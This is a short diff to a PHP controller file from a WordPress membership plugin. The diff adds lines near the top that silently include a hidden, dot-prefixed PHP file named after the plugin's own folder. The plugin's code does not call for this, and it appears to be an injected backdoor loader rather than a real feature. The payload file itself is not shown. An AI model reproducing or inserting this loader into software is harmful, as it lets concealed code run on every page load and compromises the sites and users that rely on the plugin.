@@ -1,5 +1,9 @@
 <?php if(!defined('ABSPATH')) {die('You are not allowed to call this page directly.');}
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class MeprQuadernoCtrl extends MeprBaseCtrl {
   public function load_hooks() {
     add_filter('mepr_stripe_payment_args',              array($this, 'stripe_payment_args'), 10, 2);
